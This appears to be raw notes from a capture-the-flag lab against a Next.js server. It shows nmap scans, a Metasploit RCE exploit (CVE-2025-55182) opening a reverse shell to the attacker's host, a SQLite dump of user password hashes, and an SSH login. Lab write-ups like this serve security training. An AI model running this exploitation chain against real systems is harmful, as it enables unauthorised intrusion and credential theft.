

```
nmap -sCV -A 10.129.3.139          
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-03 09:44 -0400
Nmap scan report for 10.129.3.139
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Mon, 03 Aug 2026 13:51:37 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Mon, 03 Aug 2026 13:51:38 GMT
|     Connection: close
|   Help, NCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Mon, 03 Aug 2026 13:51:39 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.99%I=7%D=8/3%Time=6A709B89%P=x86_64-pc-linux-gnu%r(Get
SF:Request,34BC,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Router-St
SF:ate-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,\x20
SF:Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x201\r
SF:\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r\nCa
SF:che-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\"\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20171
SF:75\r\nDate:\x20Mon,\x2003\x20Aug\x202026\x2013:51:37\x20GMT\r\nConnecti
SF:on:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><meta\
SF:x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20href=\"
SF:/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next\"/>
SF:<link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\x20h
SF:ref=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\x20s
SF:rc=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=\"\"
SF:></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead1\.j
SF:s\"\x20async=\"\"></script><script\x20s")%r(Help,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOption
SF:s,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-Rout
SF:er-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch
SF:\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20no
SF:-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Mon,\
SF:x2003\x20Aug\x202026\x2013:51:38\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RS
SF:C,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-S
SF:egment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x2
SF:0private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\
SF:nDate:\x20Mon,\x2003\x20Aug\x202026\x2013:51:39\x20GMT\r\nConnection:\x
SF:20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Connection:\x20close\r\n\r\n");
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   184.91 ms 10.10.14.1
2   185.02 ms 10.129.3.139


```


```
nmap -sCV --script vuln 10.129.3.139
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-03 09:44 -0400
Nmap scan report for 10.129.3.139
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:9.6p1: 
|       PACKETSTORM:179290      10.0    https://vulners.com/packetstorm/PACKETSTORM:179290      *EXPLOIT*
|       1EEC8894-D2F7-547C-827C-915BE866875C    10.0    https://vulners.com/githubexploit/1EEC8894-D2F7-547C-827C-915BE866875C  *EXPLOIT*
|       09B905C6-CD97-54E6-AD97-B0DD1AC4771B    10.0    https://vulners.com/githubexploit/09B905C6-CD97-54E6-AD97-B0DD1AC4771B  *EXPLOIT*
|       33D623F7-98E0-5F75-80FA-81AA666D1340    9.8     https://vulners.com/githubexploit/33D623F7-98E0-5F75-80FA-81AA666D1340  *EXPLOIT*
|       CVE-2026-60002  9.4     https://vulners.com/cve/CVE-2026-60002
|       F8981437-1287-5B69-93F1-657DFB1DCE59    9.3     https://vulners.com/githubexploit/F8981437-1287-5B69-93F1-657DFB1DCE59  *EXPLOIT*
|       CB2926E1-2355-5C82-A42A-D4F72F114F9B    9.3     https://vulners.com/githubexploit/CB2926E1-2355-5C82-A42A-D4F72F114F9B  *EXPLOIT*
|       B6C4923E-8565-5D3E-8E68-8D182C3DAD5C    9.3     https://vulners.com/githubexploit/B6C4923E-8565-5D3E-8E68-8D182C3DAD5C  *EXPLOIT*
|       8DEE261C-33D4-5057-BA46-E4293B705BAE    9.3     https://vulners.com/githubexploit/8DEE261C-33D4-5057-BA46-E4293B705BAE  *EXPLOIT*
|       6FD8F914-B663-533D-8866-23313FD37804    9.3     https://vulners.com/githubexploit/6FD8F914-B663-533D-8866-23313FD37804  *EXPLOIT*
|       PACKETSTORM:190587      8.1     https://vulners.com/packetstorm/PACKETSTORM:190587      *EXPLOIT*
|       FB2E9ED1-43D7-585C-A197-0D6628B20134    8.1     https://vulners.com/githubexploit/FB2E9ED1-43D7-585C-A197-0D6628B20134  *EXPLOIT*
|       FA3992CE-9C4C-5350-8134-177126E0BD3F    8.1     https://vulners.com/githubexploit/FA3992CE-9C4C-5350-8134-177126E0BD3F  *EXPLOIT*
|       EFD615F0-8F17-5471-AA83-0F491FD497AF    8.1     https://vulners.com/githubexploit/EFD615F0-8F17-5471-AA83-0F491FD497AF  *EXPLOIT*
|       EDB-ID:52269    8.1     https://vulners.com/exploitdb/EDB-ID:52269      *EXPLOIT*
|       EC20B9C2-6857-5848-848A-A9F430D13EEB    8.1     https://vulners.com/githubexploit/EC20B9C2-6857-5848-848A-A9F430D13EEB  *EXPLOIT*
|       EB13CBD6-BC93-5F14-A210-AC0B5A1D8572    8.1     https://vulners.com/githubexploit/EB13CBD6-BC93-5F14-A210-AC0B5A1D8572  *EXPLOIT*
|       E543E274-C20A-582A-8F8E-F8E3F381C345    8.1     https://vulners.com/githubexploit/E543E274-C20A-582A-8F8E-F8E3F381C345  *EXPLOIT*
|       E34FCCEC-226E-5A46-9B1C-BCD6EF7D3257    8.1     https://vulners.com/githubexploit/E34FCCEC-226E-5A46-9B1C-BCD6EF7D3257  *EXPLOIT*
|       E24EEC0A-40F7-5BBC-9E4D-7B13522FF915    8.1     https://vulners.com/githubexploit/E24EEC0A-40F7-5BBC-9E4D-7B13522FF915  *EXPLOIT*
|       DC1BB99A-8B57-5EE5-9AC4-3D9D59BFC346    8.1     https://vulners.com/githubexploit/DC1BB99A-8B57-5EE5-9AC4-3D9D59BFC346  *EXPLOIT*
|       DA18D761-BB81-54B6-85CB-CFD73CE33621    8.1     https://vulners.com/githubexploit/DA18D761-BB81-54B6-85CB-CFD73CE33621  *EXPLOIT*
|       D52370EF-02EE-507D-9212-2D8EA86CBA94    8.1     https://vulners.com/githubexploit/D52370EF-02EE-507D-9212-2D8EA86CBA94  *EXPLOIT*
|       CVE-2026-35414  8.1     https://vulners.com/cve/CVE-2026-35414
|       CVE-2026-35386  8.1     https://vulners.com/cve/CVE-2026-35386
|       CVE-2026-35385  8.1     https://vulners.com/cve/CVE-2026-35385
|       CVE-2024-6387   8.1     https://vulners.com/cve/CVE-2024-6387
|       CFEBF7AF-651A-5302-80B8-F8146D5B33A6    8.1     https://vulners.com/githubexploit/CFEBF7AF-651A-5302-80B8-F8146D5B33A6  *EXPLOIT*
|       CA24D32D-16A8-5A49-88BF-48D7CE062E8E    8.1     https://vulners.com/githubexploit/CA24D32D-16A8-5A49-88BF-48D7CE062E8E  *EXPLOIT*
|       C6FB6D50-F71D-5870-B671-D6A09A95627F    8.1     https://vulners.com/githubexploit/C6FB6D50-F71D-5870-B671-D6A09A95627F  *EXPLOIT*
|       C623D558-C162-5D17-88A5-4799A2BEC001    8.1     https://vulners.com/githubexploit/C623D558-C162-5D17-88A5-4799A2BEC001  *EXPLOIT*
|       C5B2D4A1-8C3B-5FF7-B620-EDE207B027A0    8.1     https://vulners.com/githubexploit/C5B2D4A1-8C3B-5FF7-B620-EDE207B027A0  *EXPLOIT*
|       C185263E-3E67-5550-B9C0-AB9C15351960    8.1     https://vulners.com/githubexploit/C185263E-3E67-5550-B9C0-AB9C15351960  *EXPLOIT*
|       BDA609DA-6936-50DC-A325-19FE2CC68562    8.1     https://vulners.com/githubexploit/BDA609DA-6936-50DC-A325-19FE2CC68562  *EXPLOIT*
|       BA3887BD-F579-53B1-A4A4-FF49E953E1C0    8.1     https://vulners.com/githubexploit/BA3887BD-F579-53B1-A4A4-FF49E953E1C0  *EXPLOIT*
|       B1F444E0-F217-5FC0-B266-EBD48589940F    8.1     https://vulners.com/githubexploit/B1F444E0-F217-5FC0-B266-EBD48589940F  *EXPLOIT*
|       92254168-3B26-54C9-B9BE-B4B7563586B5    8.1     https://vulners.com/githubexploit/92254168-3B26-54C9-B9BE-B4B7563586B5  *EXPLOIT*
|       91752937-D1C1-5913-A96F-72F8B8AB4280    8.1     https://vulners.com/githubexploit/91752937-D1C1-5913-A96F-72F8B8AB4280  *EXPLOIT*
|       90104C60-A887-5437-8521-545277685F55    8.1     https://vulners.com/githubexploit/90104C60-A887-5437-8521-545277685F55  *EXPLOIT*
|       89F96BAB-1624-51B5-B09E-E771D918D1E6    8.1     https://vulners.com/githubexploit/89F96BAB-1624-51B5-B09E-E771D918D1E6  *EXPLOIT*
|       81F0C05A-8650-5DE8-97E9-0D89F1807E5D    8.1     https://vulners.com/githubexploit/81F0C05A-8650-5DE8-97E9-0D89F1807E5D  *EXPLOIT*
|       7E218A18-4BBA-5B7D-A537-D5DC12AC1D6C    8.1     https://vulners.com/githubexploit/7E218A18-4BBA-5B7D-A537-D5DC12AC1D6C  *EXPLOIT*
|       7C7167AF-E780-5506-BEFA-02E5362E8E48    8.1     https://vulners.com/githubexploit/7C7167AF-E780-5506-BEFA-02E5362E8E48  *EXPLOIT*
|       79FE1ED7-EB3D-5978-A12E-AAB1FFECCCAC    8.1     https://vulners.com/githubexploit/79FE1ED7-EB3D-5978-A12E-AAB1FFECCCAC  *EXPLOIT*
|       795762E3-BAB4-54C6-B677-83B0ACC2B163    8.1     https://vulners.com/githubexploit/795762E3-BAB4-54C6-B677-83B0ACC2B163  *EXPLOIT*
|       774022BB-71DA-57C4-9B8F-E21D667DE4BC    8.1     https://vulners.com/githubexploit/774022BB-71DA-57C4-9B8F-E21D667DE4BC  *EXPLOIT*
|       743E5025-3BB8-5EC4-AC44-2AA679730661    8.1     https://vulners.com/githubexploit/743E5025-3BB8-5EC4-AC44-2AA679730661  *EXPLOIT*
|       73A19EF9-346D-5B2B-9792-05D9FE3414E2    8.1     https://vulners.com/githubexploit/73A19EF9-346D-5B2B-9792-05D9FE3414E2  *EXPLOIT*
|       6E81EAE5-2156-5ACB-9046-D792C7FAF698    8.1     https://vulners.com/githubexploit/6E81EAE5-2156-5ACB-9046-D792C7FAF698  *EXPLOIT*
|       6B78D204-22B0-5D11-8A0C-6313958B473F    8.1     https://vulners.com/githubexploit/6B78D204-22B0-5D11-8A0C-6313958B473F  *EXPLOIT*
|       65650BAD-813A-565D-953D-2E7932B26094    8.1     https://vulners.com/githubexploit/65650BAD-813A-565D-953D-2E7932B26094  *EXPLOIT*
|       649197A2-0224-5B5C-9C4E-B5791D42A9FB    8.1     https://vulners.com/githubexploit/649197A2-0224-5B5C-9C4E-B5791D42A9FB  *EXPLOIT*
|       61DDEEE4-2146-5E84-9804-B780AA73E33C    8.1     https://vulners.com/githubexploit/61DDEEE4-2146-5E84-9804-B780AA73E33C  *EXPLOIT*
|       608FA50C-AEA1-5A83-8297-A15FC7D32A7C    8.1     https://vulners.com/githubexploit/608FA50C-AEA1-5A83-8297-A15FC7D32A7C  *EXPLOIT*
|       5D2CB1F8-DC04-5545-8BC7-29EE3DA8890E    8.1     https://vulners.com/githubexploit/5D2CB1F8-DC04-5545-8BC7-29EE3DA8890E  *EXPLOIT*
|       5C81C5C1-22D4-55B3-B843-5A9A60AAB6FD    8.1     https://vulners.com/githubexploit/5C81C5C1-22D4-55B3-B843-5A9A60AAB6FD  *EXPLOIT*
|       53BCD84F-BD22-5C9D-95B6-4B83627AB37F    8.1     https://vulners.com/githubexploit/53BCD84F-BD22-5C9D-95B6-4B83627AB37F  *EXPLOIT*
|       4FB01B00-F993-5CAF-BD57-D7E290D10C1F    8.1     https://vulners.com/githubexploit/4FB01B00-F993-5CAF-BD57-D7E290D10C1F  *EXPLOIT*
|       48603E8F-B170-57EE-85B9-67A7D9504891    8.1     https://vulners.com/githubexploit/48603E8F-B170-57EE-85B9-67A7D9504891  *EXPLOIT*
|       4748B283-C2F6-5924-8241-342F98EEC2EE    8.1     https://vulners.com/githubexploit/4748B283-C2F6-5924-8241-342F98EEC2EE  *EXPLOIT*
|       452ADB71-199C-561E-B949-FCDE6288B925    8.1     https://vulners.com/githubexploit/452ADB71-199C-561E-B949-FCDE6288B925  *EXPLOIT*
|       331B2B7F-FB25-55DB-B7A4-602E42448DB7    8.1     https://vulners.com/githubexploit/331B2B7F-FB25-55DB-B7A4-602E42448DB7  *EXPLOIT*
|       1FFDA397-F480-5C74-90F3-060E1FE11B2E    8.1     https://vulners.com/githubexploit/1FFDA397-F480-5C74-90F3-060E1FE11B2E  *EXPLOIT*
|       1FA2B3DD-FC8F-5602-A1C9-2CF3F9536563    8.1     https://vulners.com/githubexploit/1FA2B3DD-FC8F-5602-A1C9-2CF3F9536563  *EXPLOIT*
|       1F7A6000-9E6D-511C-B0F6-7CADB7200761    8.1     https://vulners.com/githubexploit/1F7A6000-9E6D-511C-B0F6-7CADB7200761  *EXPLOIT*
|       1CF00BB8-B891-5347-A2DC-2C6A6BFF7C99    8.1     https://vulners.com/githubexploit/1CF00BB8-B891-5347-A2DC-2C6A6BFF7C99  *EXPLOIT*
|       1AB9F1F4-9798-59A0-9213-1D907E81E7F6    8.1     https://vulners.com/githubexploit/1AB9F1F4-9798-59A0-9213-1D907E81E7F6  *EXPLOIT*
|       179F72B6-5619-52B5-A040-72F1ECE6CDD8    8.1     https://vulners.com/githubexploit/179F72B6-5619-52B5-A040-72F1ECE6CDD8  *EXPLOIT*
|       15C36683-070A-5CC1-B21F-5F0BF974D9D3    8.1     https://vulners.com/githubexploit/15C36683-070A-5CC1-B21F-5F0BF974D9D3  *EXPLOIT*
|       1337DAY-ID-39674        8.1     https://vulners.com/zdt/1337DAY-ID-39674        *EXPLOIT*
|       11F020AC-F907-5606-8805-0516E06160EE    8.1     https://vulners.com/githubexploit/11F020AC-F907-5606-8805-0516E06160EE  *EXPLOIT*
|       0FC4BE81-312B-51F4-9D9B-66D8B5C093CD    8.1     https://vulners.com/githubexploit/0FC4BE81-312B-51F4-9D9B-66D8B5C093CD  *EXPLOIT*
|       0B165049-2374-5E2A-A27C-008BEA3D13F7    8.1     https://vulners.com/githubexploit/0B165049-2374-5E2A-A27C-008BEA3D13F7  *EXPLOIT*
|       08144020-2B5F-5EB9-9286-1ABD5477278E    8.1     https://vulners.com/githubexploit/08144020-2B5F-5EB9-9286-1ABD5477278E  *EXPLOIT*
|       CVE-2026-60000  7.5     https://vulners.com/cve/CVE-2026-60000
|       CVE-2026-59999  7.5     https://vulners.com/cve/CVE-2026-59999
|       CVE-2024-39894  7.5     https://vulners.com/cve/CVE-2024-39894
|       PACKETSTORM:189283      6.8     https://vulners.com/packetstorm/PACKETSTORM:189283      *EXPLOIT*
|       CVE-2025-26465  6.8     https://vulners.com/cve/CVE-2025-26465
|       9D8432B9-49EC-5F45-BB96-329B1F2B2254    6.8     https://vulners.com/githubexploit/9D8432B9-49EC-5F45-BB96-329B1F2B2254  *EXPLOIT*
|       85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0    6.8     https://vulners.com/githubexploit/85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0  *EXPLOIT*
|       1337DAY-ID-39918        6.8     https://vulners.com/zdt/1337DAY-ID-39918        *EXPLOIT*
|       CVE-2026-60001  6.5     https://vulners.com/cve/CVE-2026-60001
|       CVE-2026-59998  6.5     https://vulners.com/cve/CVE-2026-59998
|       CVE-2026-35387  6.5     https://vulners.com/cve/CVE-2026-35387
|       CVE-2025-26466  5.9     https://vulners.com/cve/CVE-2025-26466
|       BA7AC73B-AD50-5056-88E4-49E135337993    5.9     https://vulners.com/githubexploit/BA7AC73B-AD50-5056-88E4-49E135337993  *EXPLOIT*
|       B96EAFCA-CE3F-51B0-86CF-4EB92B1C4FEF    5.9     https://vulners.com/githubexploit/B96EAFCA-CE3F-51B0-86CF-4EB92B1C4FEF  *EXPLOIT*
|       CVE-2026-59997  5.4     https://vulners.com/cve/CVE-2026-59997
|       CVE-2026-59996  5.4     https://vulners.com/cve/CVE-2026-59996
|       CVE-2026-59995  5.4     https://vulners.com/cve/CVE-2026-59995
|       CVE-2025-32728  4.3     https://vulners.com/cve/CVE-2025-32728
|       CVE-2025-61985  3.6     https://vulners.com/cve/CVE-2025-61985
|       CVE-2025-61984  3.6     https://vulners.com/cve/CVE-2025-61984
|       B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150    3.6     https://vulners.com/githubexploit/B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150  *EXPLOIT*
|       4C6E2182-0E99-5626-83F6-1646DD648C57    3.6     https://vulners.com/githubexploit/4C6E2182-0E99-5626-83F6-1646DD648C57  *EXPLOIT*
|_      CVE-2026-35388  2.5     https://vulners.com/cve/CVE-2026-35388
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Mon, 03 Aug 2026 13:50:27 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Mon, 03 Aug 2026 13:50:30 GMT
|     Connection: close
|   Help, NCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.99%I=7%D=8/3%Time=6A709B45%P=x86_64-pc-linux-gnu%r(Get
SF:Request,1518,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Router-St
SF:ate-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,\x20
SF:Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x201\r
SF:\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r\nCa
SF:che-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\"\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20171
SF:75\r\nDate:\x20Mon,\x2003\x20Aug\x202026\x2013:50:27\x20GMT\r\nConnecti
SF:on:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><meta\
SF:x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20href=\"
SF:/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next\"/>
SF:<link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\x20h
SF:ref=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\x20s
SF:rc=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=\"\"
SF:></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead1\.j
SF:s\"\x20async=\"\"></script><script\x20s")%r(Help,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOption
SF:s,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-Rout
SF:er-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch
SF:\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20no
SF:-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Mon,\
SF:x2003\x20Aug\x202026\x2013:50:30\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RS
SF:C,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-S
SF:egment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x2
SF:0private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\
SF:nDate:\x20Mon,\x2003\x20Aug\x202026\x2013:50:30\x20GMT\r\nConnection:\x
SF:20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Connection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```



![[Pasted image 20260803203907.png]]


```
msfconsole  
search nextjs CVE
```

```
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > show options

Module options (exploit/multi/http/react2shell_unauth_rce_cve_2025_55182):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, http, socks5h, sapni, soc
                                         ks4
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Path to the React App
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_nodejs):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Next.js - Unix Command



View the full module info with the info, or info -d command.

msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set RHOSTS 10.129.3.139
RHOSTS => 10.129.3.139
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set RPORT 3000
RPORT => 3000
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set LHOST 10.10.14.60
LHOST => 10.10.14.60
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > exploit
[*] Started reverse TCP handler on 10.10.14.60:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Command shell session 1 opened (10.10.14.60:4444 -> 10.129.3.139:43872) at 2026-08-03 10:14:04 -0400

id
uid=999(node) gid=988(node) groups=988(node)
python3 -c "import pty;pty.spawn('/bin/bash')"
node@reactor:/opt/reactor-app$ pwd
pwd
/opt/reactor-app
node@reactor:/opt/reactor-app$ cd ../../../
cd ../../../
node@reactor:/$ ls 
ls
bin                dev   lib64              mnt   run                 srv  var
bin.usr-is-merged  etc   lib.usr-is-merged  opt   sbin                sys
boot               home  lost+found         proc  sbin.usr-is-merged  tmp
cdrom              lib   media              root  snap                usr
node@reactor:/$ cd home
cd home
node@reactor:/home$ ls
ls
engineer  node
node@reactor:/home$ whoami
whoami
node
node@reactor:/home$ cd node
cd node
node@reactor:~$ ls
ls
node@reactor:~$ ls -la
ls -la
total 20
drwxr-x--- 2 node node 4096 May 18 11:40 .
drwxr-xr-x 4 root root 4096 May 18 11:40 ..
lrwxrwxrwx 1 root root    9 May 18 10:38 .bash_history -> /dev/null
-rw-r--r-- 1 node node  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 node node 3771 Mar 31  2024 .bashrc
-rw-r--r-- 1 node node  807 Mar 31  2024 .profile
node@reactor:~$ cd ../../opt
cd ../../opt
node@reactor:/opt$ cd reactor-app
cd reactor-app
node@reactor:/opt/reactor-app$ ls
ls
app  next.config.js  node_modules  package.json  package-lock.json  reactor.db
node@reactor:/opt/reactor-app$ sqlite3 reactor.db .dump
sqlite3 reactor.db .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    email TEXT
);
INSERT INTO users VALUES(1,'admin','a203b22191d744a4e70ada5c101b17b8','administrator','admin@reactor.htb');
INSERT INTO users VALUES(2,'engineer','39d97110eafe2a9a68639812cd271e8e','operator','engineer@reactor.htb');
CREATE TABLE sensor_logs (
    id INTEGER PRIMARY KEY,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    sensor_id TEXT,
    reading REAL,
    status TEXT
);
INSERT INTO sensor_logs VALUES(1,'2025-12-28 14:32:01','CORE_TEMP_01',324.5,'NOMINAL');
INSERT INTO sensor_logs VALUES(2,'2025-12-28 14:32:01','PRESSURE_01',155.199999999999988,'NOMINAL');
INSERT INTO sensor_logs VALUES(3,'2025-12-28 14:32:01','COOLANT_FLOW',18.3999999999999985,'CAUTION');
COMMIT;
node@reactor:/opt/reactor-app$ 

```


```
ssh engineer@10.129.3.139              
engineer@10.129.3.139's password: 
 ____  _____    _    ____ _____ ___  ____  
|  _ \| ____|  / \  / ___|_   _/ _ \|  _ \ 
| |_) |  _|   / _ \| |     | || | | | |_) |
|  _ <| |___ / ___ \ |___  | || |_| |  _ < 
|_| \_\_____/_/   \_\____| |_| \___/|_| \_\

    ReactorWatch Core Monitoring System
